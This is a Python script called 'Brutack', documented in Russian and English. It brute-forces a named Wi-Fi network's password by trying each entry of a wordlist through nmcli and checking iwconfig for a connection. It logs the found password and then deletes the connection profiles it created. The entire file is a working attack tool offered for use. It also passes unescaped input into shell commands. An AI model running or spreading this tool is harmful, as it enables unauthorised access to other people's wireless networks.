# -*- coding: utf-8 -*-
"""
Created on Sun Dec 15 21:28:22 2019
Edited on Mon Jan 06 15:40 2020

@author: Nickel

____________________________________________________________

ru

Использование через shell:
python3 brutack.py <имя wi-fi соединения> <файл с паролями>

Файл с паролями должен быть в той же директории, что и "Brutack".
В противном случае, необходимо указать полный путь до файла.
Файл с паролями должен быть в кодировке UTF-8.

Информация о процессе подбора записывается в текстовый файл с 
именем "Brutack_LogOut.txt" в расположении "Brutack"a. 

(Многопоточный подход используется с целью обойти "зависание" сценария
во время появления окна ввода данных для соединения с wi-fi: если по данным 
системы соединение с использованием указанного пароля не установлено,
поток закрывается (тем самым, закрывая окно ввода данных для соединения с wi-if)
и открывается новый.)
_____________________________________________________________

en

Using by shell:

python3 brutack.py <wireless network name> <file with passwords>

File with passwords must be located in the same directory, as "Brutack".
If it is not, designate full path to the file.
File with passwords must be UTF-8 coding.

Information about brute-force attack process is writing to the
"Brutack_LogOut.txt", located in "Brutack"s directory.

_____________________________________________________________



"""


import os, threading, sys, time
from functools import reduce, wraps

def singleton(cls):
    instance = None
    @wraps(cls)
    def onCall(*args, **kwargs):
        nonlocal instance
        if not instance:
            instance = cls(*args, **kwargs)
        return instance
    return onCall
        
        
        
@singleton
class writeLog:
    '''
    Redirects sys.stdout to the log-file.
    When exiting, returns sys.stdout's standard value.
    '''
    
    def __init__(self):
        self.savingOut = sys.stdout
        self.call = 0
        
    def __enter__(self):
        if not self.call:
            mode = 'w' # If it is the first time of use: rewrite old file.
        else:
            mode = 'a'
        sys.stdout = open('Brutack_LogOut.txt', mode)
        self.call+=1
        
    def __exit__(self, exc_type, exc_value, exc_traceback):
        '''
        Any errors will be shown.
        '''
        if exc_type is None:
            sys.stdout.close()
            sys.stdout = writeToLog.savingOut
        else:
            print('An error was occured during writing log:', exc_type, exc_value,exc_traceback)
            return False # Necessary to propogate error at upper level.
            
            
writeToLog = writeLog()
Done = False
attempt = 0
success = 0

def check_connection(Verify = False):
    time.sleep(5)
    connection = os.popen('iwconfig', 'r')
    text = reduce((lambda x,y: str(x)+str(y)), connection.readlines() )
    ESSID = text.find('ESSID:')
    connected = (text[ESSID+6:ESSID+9])
    connection.close()
    
    if not Verify:
        return connected
    if Verify:
        if str(connected) != 'off':
            return True
        if str(connected) == 'off':
            return False
        

def Brute(name, password, lock):
    global Done, attempt
    
    with lock:
        os.popen('nmcli dev wifi connect {0} password {1}'.format(name, password))
        connected = check_connection()
        
        attempt+=1
        
        if str(connected) != 'off':
            if not check_connection(Verify = True):
                print('Password number', attempt, 'was tried. No result...')
                sys.exit()
            if check_connection(Verify = True):            
                with writeToLog:
                    print( 'Done! At '+str(attempt)+' try. \n\n\n\n!\n\n\n\nIts a "{0}"'.format(password))
                    Done = True
                sys.exit()
        else:
            with writeToLog:
                print('Password number', attempt, 'was tried. No result...')
            sys.exit()


if __name__ == '__main__':

    name = sys.argv[1]
    
    # This block collecting info from system arguments.
    try:
        with open(sys.argv[2], 'r') as bruteWords:
            passwords = [ i.rstrip() for i in bruteWords]
    except FileNotFoundError:
        file = str(os.getcwd())+os.sep+str(sys.argv[2])
        with open(file, 'r') as bruteWords:
            passwords = [ i.rstrip() for i in bruteWords]
    except Exception:
        print('''Unexpected error. Use "python3 brutack.py 
<name_of_wi-fi_connection> <file_with_passwords>" format of command.
The file with passwords must be in the same directory as "brutack", or contains
 full path to the file.''')
        sys.exit()
    #
    

    ## This block is creating threads and trying connect to necessary wi-fi,
    ## using passwords from designated file.    
    try:
        lock = threading.Lock()
        with writeToLog:
            for passw in passwords:
                if not Done:
                    x = threading.Thread( target = Brute, args = (name, passw, lock))
                    x.start()
                    x.join()
                else:
                    print('Brute-force attack well done. Exiting.')
                    break     
    except BrokenPipeError: # Some strange error... I don't know,
    # what is it, so lets just pass it
        pass
    except Exception:
        with writeToLog:
            print('Unexpected error!', sys.exc_info())
            pass        
    finally:
        for each in range(1, attempt):
            x = os.popen("nmcli connection delete '{0} {1}'".format(name, each))
            time.sleep(2)
            x.close()
            with writeToLog:
                print('connection', name, each, ' delete ')
#%%